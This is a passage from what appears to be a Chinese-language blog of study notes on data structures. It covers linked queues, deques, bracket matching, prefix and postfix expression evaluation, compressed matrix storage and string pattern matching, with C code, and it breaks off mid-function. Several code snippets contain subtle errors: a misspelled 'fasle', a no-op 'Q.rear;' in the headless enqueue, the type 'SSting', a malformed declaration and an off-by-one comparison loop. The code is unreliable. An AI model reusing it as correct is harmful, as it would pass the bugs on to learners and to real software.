class="line">Q.front=<span class="literal">NULL</span>;</span><br><span class="line">Q.rear=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">IsEmpty</span><span class="params">(LinkQueue Q)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(Q.front==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="入队-带头结点"><a href="#入队-带头结点" class="headerlink" title="入队(带头结点)"></a>入队(带头结点)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(LinkQueue &amp;Q,ElemType x)</span>&#123;</span><br><span class="line">LinkNode *s=(LinkNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));</span><br><span class="line">s-&gt;data=x;</span><br><span class="line">s-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">Q.rear-&gt;next=s;</span><br><span class="line">Q.rear=s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="入队-不带头结点"><a href="#入队-不带头结点" class="headerlink" title="入队(不带头结点)"></a>入队(不带头结点)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(LinkQueue &amp;Q,ElemType x)</span>&#123;</span><br><span class="line">LinkNode *s=(LinkNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));</span><br><span class="line">s-&gt;data=x;</span><br><span class="line">s-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>(Q.front==<span class="literal">NULL</span>)&#123;</span><br><span class="line">Q.front=s;</span><br><span class="line">Q.rear;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">Q.rear-&gt;next=s;</span><br><span class="line">Q.rear=s;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="出队-带头结点"><a href="#出队-带头结点" class="headerlink" title="出队(带头结点)"></a>出队(带头结点)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">DeQueue</span><span class="params">(LinkQueue &amp;Q,ElemType &amp;x)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>((Q.front)==Q.rear)&#123;</span><br><span class="line"><span class="keyword">return</span> fasle;</span><br><span class="line">&#125;</span><br><span class="line">LinkNode *p=Q.front-&gt;next;</span><br><span class="line">x=p-&gt;data;</span><br><span class="line">Q.front-&gt;next=p-&gt;next;</span><br><span class="line"><span class="keyword">if</span>(Q.rear==p)&#123;</span><br><span class="line">Q.rear=Q.front;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="出队-不带头结点"><a href="#出队-不带头结点" class="headerlink" title="出队(不带头结点)"></a>出队(不带头结点)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">DeQueue</span><span class="params">(LinkQueue &amp;Q,ElemType &amp;x)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(Q.front==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">LinkNode *p=Q.front;</span><br><span class="line">x=p-&gt;data;</span><br><span class="line">Q.front=p-&gt;next;</span><br><span class="line"><span class="keyword">if</span>(Q.rear==p)&#123;</span><br><span class="line">   Q.front=<span class="literal">NULL</span>;</span><br><span class="line">Q.rear=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-7-双端队列"><a href="#3-7-双端队列" class="headerlink" title="3.7 双端队列"></a>3.7 双端队列</h2><p><strong>双端队列</strong>:允许从两端插入，两端删除的队列<br><strong>输入受限的双端队列</strong>:允许从两端删除，从一端插入的队列<br><strong>输出受限的双端队列</strong>:允许从两端插入，从一端删除的队列<br><strong>考点</strong>:判断输出序列合法性</p><h2 id="3-8-栈在括号匹配中的应用"><a href="#3-8-栈在括号匹配中的应用" class="headerlink" title="3.8 栈在括号匹配中的应用"></a>3.8 栈在括号匹配中的应用</h2><p>遇到左括号就入栈<br>遇到右括号,就”消耗”一个左括号<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10 <span class="comment">//定义栈中元素的最大个数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="type">char</span> data[MaxSize]; <span class="comment">//静态数组存放栈中元素</span></span><br><span class="line"><span class="type">int</span> top; </span><br><span class="line">&#125;SqStack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化栈 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span><span class="params">(SqStack &amp;S)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//判断栈是否为空 </span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">StackEmpty</span><span class="params">(SqStack S)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//新元素入栈 </span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">Push</span><span class="params">(SqStack &amp;S,<span class="type">char</span> x)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//栈顶元素出栈.用x返回 </span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">Pop</span><span class="params">(SqStack &amp;S,<span class="type">char</span> &amp;x)</span> </span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">bracketCheck</span><span class="params">(<span class="type">char</span> str[],<span class="type">int</span> length)</span>&#123;</span><br><span class="line">SqStack S;</span><br><span class="line">InitStack(S); <span class="comment">//初始化一个栈</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(str[i]==<span class="string">&#x27;(&#x27;</span> || str[i]==<span class="string">&#x27;[&#x27;</span> || str[i]==<span class="string">&#x27;&#123;&#x27;</span>)&#123;</span><br><span class="line">Push(S,str[i]);  <span class="comment">//扫描到左括号,入栈 </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(StackEmpty(S))&#123; <span class="comment">//扫描到右括号,且当前栈空 </span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;  <span class="comment">//匹配失败 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> topElem;</span><br><span class="line">Pop(S,topElem); <span class="comment">//栈顶元素出栈 </span></span><br><span class="line"><span class="keyword">if</span>(str[i]==<span class="string">&#x27;)&#x27;</span>&amp;&amp; topElem!=<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(str[i]==<span class="string">&#x27;]&#x27;</span>&amp;&amp; topElem!=<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(str[i]==<span class="string">&#x27;&#125;&#x27;</span>&amp;&amp; topElem!=<span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> StackEmpty(S);  <span class="comment">//检索完全部括号后,栈空说明匹配成功 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/54414150953.png" alt=""><br><strong>用栈实现括号匹配</strong>: 依次扫描所有字符,遇到左括号入栈,遇到右括号则弹出栈顶元素检查是否匹配<br><strong>匹配失败情况</strong>: 1.左括号单身 2.右括号单身 3.左右括号不匹配</p><h2 id="3-9-栈在表达式求值中的应用（上）-后缀为重点"><a href="#3-9-栈在表达式求值中的应用（上）-后缀为重点" class="headerlink" title="3.9 栈在表达式求值中的应用（上）(后缀为重点)"></a>3.9 栈在表达式求值中的应用（上）(后缀为重点)</h2><p>Reverse Polish notation (逆波兰表达式=后缀表达式)<br>Polish natation(波兰表达式=前缀表达式)<br>中缀表达式:运算符在两个操作数中间<br>后缀表达式:运算符在两个操作数后面<br>前缀表达式:运算符在两个操作数前面<br>例子:<br>| 中缀表达式    |  后缀表达式   | 前缀表达式     |<br>| —- | —- | —- |<br>|   a+b  |  ab+   |   +ab  |<br>|  a+b-c    |  ab+c-   |   -+abc |<br>|   a+b-c*d  |   ab+cd*-  | -+ab cd*   |</p><h3 id="中缀表达式转后缀表达式-手算"><a href="#中缀表达式转后缀表达式-手算" class="headerlink" title="中缀表达式转后缀表达式(手算):"></a>中缀表达式转后缀表达式(手算):</h3><p>1.确定中缀表达式中各个运算符的运算顺序<br>2.选择下一个运算符,按照[左操作数 右操作数 运算符]的方式组合成一个新的操作数<br>3.如果还有运算符没被处理,就继续2<br>如:<br>    ((15÷(7-(1+1)))×3)-(2+(1+1))<br> =&gt;     15 7 1 1 + - ÷    2 1 1+ +  -<br>        A+B*(C-D)-E/F<br>=&gt;     AB CD-*+   EF/ -  或 ABCD-*  EF/ -+ (<strong>客观来看两种都正确,只是”机算”结果是前者</strong>)<br>       运算顺序不唯一,因此对应的后缀表达式也不唯一<br>       “左优先”原则,不要freestyle,保证手算和机算结果相同<br>       “左优先”原则:只要左边的运算符能先计算,就优先算左边的(可保证运算服务顺序唯一)<br>       A+B-C*D/E+F<br>=&gt;       AB+CD*E/-F+</p><h3 id="后缀表达式的计算-手算"><a href="#后缀表达式的计算-手算" class="headerlink" title="后缀表达式的计算(手算)"></a>后缀表达式的计算(手算)</h3><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/4021543200954.png" alt=""><br>后缀表达式的手算方法:<br>从左往右扫描,每遇到一个运算符,就让运算符前面最近的两个操作数执行对应运算.<br>合体为一个操作数<br>注意:两个操作数的左右顺序<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/1235959219380.png" alt=""></p><h3 id="后缀表达式的计算-机算"><a href="#后缀表达式的计算-机算" class="headerlink" title="后缀表达式的计算(机算)"></a>后缀表达式的计算(机算)</h3><p>用栈实现后缀表达式的计算<br>1.<mark>从左往右</mark>扫描下一个元素,直到处理完所有元素<br>2.若扫描到操作数则压入栈,并回到1;否则执行3<br>3.若扫描到运算符,则弹出两个栈顶元素,执行相应运算,运算结果压倒栈顶,回到1<br><strong>注意:先出栈的是”右操作数”</strong><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/996415190955.gif" alt="1"></p><p>若表达式合法,则最后栈中只会留下一个元素,就是最终结果<br>练习题;<br>15 7 1 1 + - ÷ 3 × 2 1 1 + + -<br>答案:5</p><h3 id="中缀表达式转前缀表达式-手算"><a href="#中缀表达式转前缀表达式-手算" class="headerlink" title="中缀表达式转前缀表达式(手算)"></a>中缀表达式转前缀表达式(手算)</h3><p>中缀转前缀的手算方法:<br>1.确定中缀表达式中各个运算符的运算顺序<br>2.选择下一个运算符,按照[运算符 左操作数 右操作数]的方式组合成一个新的操作数<br>3.如果还有运算符没被处理,就继续2<br>“右优先”原则:只要右边的运算符能先计算,就优先算右边的<br>A+B*(C-D)-E/F<br>=&gt; - +A<em>B-CD  /EF 或 +A-\</em>B-CD/EF<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/1525417237413.png" alt=""></p><h3 id="前缀表达式的计算"><a href="#前缀表达式的计算" class="headerlink" title="前缀表达式的计算"></a>前缀表达式的计算</h3><p>用栈实现前缀表达式的计算<br>1.从右往左扫描下一个元素,直到处理完所有元素<br>2.若扫描到操作数则压入栈,并回到1;否则执行3<br>3.若扫描到运算符,则弹出两个栈顶元素,执行相应运算,运算结果压回栈顶,回到1<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/5128121230082.png" alt=""><br><strong>注意:先出栈的是”左操作数”</strong></p><h2 id="3-10-栈在表达式求值中的应用（下）"><a href="#3-10-栈在表达式求值中的应用（下）" class="headerlink" title="3.10 栈在表达式求值中的应用（下）"></a>3.10 栈在表达式求值中的应用（下）</h2><h3 id="中缀表达式转后缀表达式-机算"><a href="#中缀表达式转后缀表达式-机算" class="headerlink" title="中缀表达式转后缀表达式(机算)"></a>中缀表达式转后缀表达式(机算)</h3><p>初始化一个栈,用于保存<mark>暂时还不能确定运算顺序的运算符</mark>.<br>从左到右处理各个元素,直到末尾.可能遇到三种情况:<br>1.遇到<mark>操作数</mark>.直接加入后缀表达式<br>2.遇到<mark>界限符</mark>.遇到”(“直接入栈;遇到”)”则依次弹出栈内运算符并加入后缀表达式,<br>3.遇到<mark>运算符</mark>.依次弹出栈中<mark>优先级</mark>高于或等于当前运算符的所有运算符,并加入后缀表达式,<br>若碰到”(“或栈空则停止.之后再把当前运算符入栈.<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/1781232197248.gif" alt="3"><br>按上述方法处理完所有字符后,将栈中剩余运算符依次弹出,并加入后缀表达式</p><h3 id="中缀表达式的计算-用栈实现"><a href="#中缀表达式的计算-用栈实现" class="headerlink" title="中缀表达式的计算(用栈实现)"></a>中缀表达式的计算(用栈实现)</h3><p><strong>中缀转后缀+后缀表达式求值 两个算法的结合</strong><br>用栈实现中缀表达式的计算:<br>初始化两个栈,操作数栈和运算符栈<br>若扫描到操作数,压入操作数栈<br>若扫描到运算符或界限符,则按照”中缀转后缀”相同的逻辑压入运算符栈(期间也会<mark>弹出</mark><br>运算符,<mark>每当弹出一个运算符时,就需要再弹出两个操作数栈的栈顶元素并执行相应运算,运算结果再压回操作数栈</mark>)<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/3401027209381.gif" alt="2"></p><h2 id="3-11-栈在递归中的应用"><a href="#3-11-栈在递归中的应用" class="headerlink" title="3.11 栈在递归中的应用"></a>3.11 栈在递归中的应用</h2><p>函数调用的特点:最后被调用的函数最先执行结束(LIFO)<br>函数调用时,需要用一个栈存储:<br>1.调用返回地址<br>2.实参<br>3.局部变量<br>适合用”递归”算法解决:可以把原始问题转换为<mark>属性相同</mark>,但<mark>规模较小</mark>的问题<br>Eg1: 计算正整数的阶层n!<br>Eg2:求斐波那契数列<br>递归调用时,函数调用栈可称为”递归工作栈”<br>每进入一层递归,就将递归调用所需信息压入栈顶<br>每退出一层递归,就从栈顶弹出相应信息<br>缺点:太多层递归可能会导致栈溢出<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/2973745217414.png" alt=""><br>缺点:可能包含很多重复计算</p><h2 id="3-12-队列的应用"><a href="#3-12-队列的应用" class="headerlink" title="3.12 队列的应用"></a>3.12 队列的应用</h2><p>树的层次遍历<br>图的广度优先遍历<br>在操作系统中的应用:多个进程争抢着使用有限的系统资源时,FCFS(First Come First Service,先来先服务)是一种常用策略.<br>Eg:打印数据缓冲区</p><h2 id="3-13-特殊矩阵的压缩存储"><a href="#3-13-特殊矩阵的压缩存储" class="headerlink" title="3.13 特殊矩阵的压缩存储"></a>3.13 特殊矩阵的压缩存储</h2><h3 id="一维数组的存储结构"><a href="#一维数组的存储结构" class="headerlink" title="一维数组的存储结构"></a>一维数组的存储结构</h3><p>ElemType a[10];<br>起始地址:LOC<br>各数组元素大小相同,且物理上连续存放.<br>数组元素a[i]的存放地址=LOC+i*sizeof(EleType)<br>注:除非题目特别说明,否则数组下标默认从0开始</p><h3 id="二维数组的存储结构"><a href="#二维数组的存储结构" class="headerlink" title="二维数组的存储结构"></a>二维数组的存储结构</h3><p>ElemType b[2][4];<br>行优先存储或者列优先存储<br>M行N列的二维数组b[M][N]中,<br>若按行优先存储,则<br>b[i][j]的存储地址=LOC+(i<em>N+j)\</em>sizesof(ElemType)</p><p>若按列优先存储,则<br>b[i][j]的存储地址=LOC+(j<em>M+i)\</em>sizesof(ElemType)</p><h3 id="普通矩阵的存储"><a href="#普通矩阵的存储" class="headerlink" title="普通矩阵的存储"></a>普通矩阵的存储</h3><p>可用二维数组存储</p><h3 id="对称矩阵的压缩存储"><a href="#对称矩阵的压缩存储" class="headerlink" title="对称矩阵的压缩存储"></a>对称矩阵的压缩存储</h3><p>策略:只存储主对角线+下三角区<br>按行优先原则将各元素存入一维数组中<br>数组大小应为(1+n)*n/2<br>关于矩阵下标和一维数组下标的映射:<br>问按照行优先的原则,ai,j 是<mark>第</mark>(1+i)i/2+j<mark>个元素</mark><br>按照列优先的原则是[[n+(n-1)+…+(n-j+2)]+(i-j)+1]</p><h3 id="三角矩阵的压缩存储"><a href="#三角矩阵的压缩存储" class="headerlink" title="三角矩阵的压缩存储"></a>三角矩阵的压缩存储</h3><p>压缩存储策略:按行优先原则将橙色区元素存入一维数组中.并在最后一个位置存储常量c<br>下三角矩阵:按照行优先的原则,是<mark>B[0]B[k]开始 k=</mark>(1+i)i/2+j-1 ,上三角区域都是(1+n)n/2<br>上三角矩阵:按照行优先的原则,是<mark>B[0]B[k]开始 k=</mark>(n+(n-1)+…+(n-i+2))+(j-i) ,下三角区域都是(1+n)n/2</p><h3 id="三对角矩阵的压缩存储"><a href="#三对角矩阵的压缩存储" class="headerlink" title="三对角矩阵的压缩存储"></a>三对角矩阵的压缩存储</h3><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/954528220083.png" alt=""><br>一共需要存储3*n-2个元素</p><p>前i-1行共3(i-1)-1个元素<br>ai,j是i行第j-i+2个元素<br>ai,j是第2i+j-2个元素,k=2i+j-3</p><p>反问:若已知数组下标k,如何得到i,j?<br>第k+1个元素,在第几行?第几列?<br>前i-1行共3(i-1)-1个元素<br>前i行共3i-1个元素<br>显然,3(i-1)-1<k+1<=3i-1i>=(k+2)/3  =&gt; i=⌈(k+2)/3⌉ (向上取整符号)<br>由k=2i+j-3得j<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/4888940216638.png" alt=""></p><h3 id="稀疏矩阵的压缩存储"><a href="#稀疏矩阵的压缩存储" class="headerlink" title="稀疏矩阵的压缩存储"></a>稀疏矩阵的压缩存储</h3><p>稀疏矩阵:非零元素远远少于矩阵元素的个数<br>压缩存储策略:<br>顺序存储—三元组&lt;行,列,值&gt;<br>链式存储—十字链表法</p><h1 id="4-串"><a href="#4-串" class="headerlink" title="4.串"></a>4.串</h1><h2 id="4-1-串的定义和基本操作"><a href="#4-1-串的定义和基本操作" class="headerlink" title="4.1 串的定义和基本操作"></a>4.1 串的定义和基本操作</h2><h2 id="4-2-串的存储结构"><a href="#4-2-串的存储结构" class="headerlink" title="4.2 串的存储结构"></a>4.2 串的存储结构</h2><h3 id="串的顺序存储"><a href="#串的顺序存储" class="headerlink" title="串的顺序存储"></a>串的顺序存储</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXLEN 255  <span class="comment">//预定义最长串为255 </span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="type">char</span> ch[MAXLEN];  <span class="comment">//每个分量存储一个字符 </span></span><br><span class="line"><span class="type">int</span> length; <span class="comment">//串的实际长度 </span></span><br><span class="line">&#125;SString;  </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="type">char</span> *ch;</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line">&#125;HString;</span><br><span class="line"></span><br><span class="line">HString S;</span><br><span class="line">S.ch=(<span class="type">char</span> *)<span class="built_in">malloc</span>(MAXLEN * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">S.length=<span class="number">0</span>; </span><br></pre></td></tr></table></figure><h3 id="串的链式存储"><a href="#串的链式存储" class="headerlink" title="串的链式存储"></a>串的链式存储</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StringNode</span>&#123;</span></span><br><span class="line"><span class="type">char</span> ch; <span class="comment">//每个结点存1个字符  1B</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">StringNode</span> * <span class="title">next</span>;</span>  <span class="comment">//4B</span></span><br><span class="line">&#125;StringNode,* String;</span><br></pre></td></tr></table></figure><p>存储密度低,每个字符1B,每个指针4B<br>解决方案:每个结点存多个字符<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StringNode</span>&#123;</span></span><br><span class="line"><span class="type">char</span> ch[<span class="number">4</span>]; </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">StringNode</span> * <span class="title">next</span>;</span>  <span class="comment">//4B</span></span><br><span class="line">&#125;StringNode,* String;</span><br></pre></td></tr></table></figure></p><h3 id="求子串"><a href="#求子串" class="headerlink" title="求子串"></a>求子串</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXLEN 255  <span class="comment">//预定义最长串为255 </span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="type">char</span> ch[MAXLEN];  <span class="comment">//每个分量存储一个字符 </span></span><br><span class="line"><span class="type">int</span> length; <span class="comment">//串的实际长度 </span></span><br><span class="line">&#125;SString;  </span><br><span class="line"></span><br><span class="line">S.ch =<span class="string">&quot;wangdao&quot;</span></span><br><span class="line">S.length=<span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> SubString(SString &amp;Sub,SString S,<span class="type">int</span> pos,<span class="type">int</span> len)&#123;</span><br><span class="line"><span class="keyword">if</span>(pos+len<span class="number">-1</span>&gt;S.length)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=pos;i&lt;pos+len;i++)&#123;</span><br><span class="line">Sub.ch[i-pos+<span class="number">1</span>]=S.ch[i];</span><br><span class="line">&#125;</span><br><span class="line">Sub.length = len;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="比较大小"><a href="#比较大小" class="headerlink" title="比较大小"></a>比较大小</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">S.ch =<span class="string">&quot;wangdao&quot;</span></span><br><span class="line">S.length=<span class="number">7</span></span><br><span class="line"><span class="type">int</span> StrCompare(SString S,SSting T)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;S.length&amp;&amp;i&lt;T.length;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(S.ch[i]!=T.ch[i])&#123;</span><br><span class="line"><span class="keyword">return</span> S.ch[i]-T.ch[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//扫描过的所有字符都相同,则长度长的串更大 </span></span><br><span class="line"><span class="keyword">return</span> S.length-T.length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="定位操作"><a href="#定位操作" class="headerlink" title="定位操作"></a>定位操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Index</span><span class="params">(SString S,SString T)</span>&#123;</span><br><span class="line"><span class="type">int</span> i=<span class="number">1</span>,n=StrLength(S),m=StrLength(T);</span><br><span class="line">SString sub;</span><br><span class="line"><span class="keyword">while</span>(i&lt;=n-m+<span class="number">1</span>)&#123;</span><br><span class="line">SubString(sub,S,i,m);</span><br><span class="line"><span class="keyword">if</span>(StrCompare(sub,T)!=<span class="number">0</span>) ++i;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="4-3-朴素模式匹配算法"><a href="#4-3-朴素模式匹配算法" class="headerlink" title="4.3 朴素模式匹配算法"></a>4.3 朴素模式匹配算法</h2><p>主串长度为n,模式串长度为m<br>朴素模式匹配算法:将主串中所有长度为m的子串依次与模式串对比,直到找到一个完全匹配的子串,<br>或所有的子串都不匹配为止<br>暴力解法,最多对比n-m+1个子串<br>代码1就是<a href="#定位操作">#定位操作</a><br>代码2指针定位算法:<br>若当前子串匹配模式失败,则主串指针i指向下一个子串的第一个位置,模式串指针j回到 模式串的第一个位置<br>若j&gt;T.length,则当前子串匹配成功,返回当前子串第一个字符的位置— <mark>i-T.length</mark><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Index</span><span class="params">(SString S,SString T)</span>&#123;</span><br><span class="line"><span class="type">int</span> i=<span class="number">1</span>;j=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(i&lt;=S.length&amp;&amp;j&lt;=T.length)&#123;</span><br><span class="line"><span class="keyword">if</span>(S.ch[i]==T.ch[j])&#123;</span><br><span class="line">++i;++j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span 